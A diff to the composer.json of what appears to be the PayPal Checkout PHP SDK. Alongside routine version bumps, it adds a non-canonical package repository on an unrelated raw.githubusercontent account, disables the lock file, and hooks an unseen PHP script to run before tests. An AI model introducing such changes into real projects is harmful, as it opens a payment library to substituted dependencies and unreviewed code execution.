@@ -12,7 +12,16 @@
     "type": "library",
     "license": "Apache-2.0",
     "homepage": "http://github.com/paypal/Checkout-PHP-SDK/",
+    "repositories": [
+        {
+            "type": "composer",
+            "url": "https://raw.githubusercontent.com/Training-Datasmith/composer-index/remote-test-2026-11-09",
+            "canonical": false
+        }
+    ],
     "require": {
+        "php": ">=8.1",
+        "ext-curl": "*",
         "paypal/paypalhttp": "1.0.1"
     },
     "authors": [
@@ -22,7 +31,7 @@
         }
     ],
     "require-dev": {
-        "phpunit/phpunit": "^5.7"
+        "phpunit/phpunit": "^9.6.33"
     },
     "autoload": {
         "psr-4": {
@@ -36,7 +45,15 @@
         }
     },
     "scripts": {
-        "unit": "phpunit --testsuite unit",
-        "integration": "phpunit --testsuite integration"
+        "pins": "php scripts/check-cluster-pins.php",
+        "integration": [
+            "@pins",
+            "phpunit --testsuite integration"
+        ],
+        "test": "@integration"
+    },
+    "config": {
+        "lock": false,
+        "sort-packages": true
     }
 }
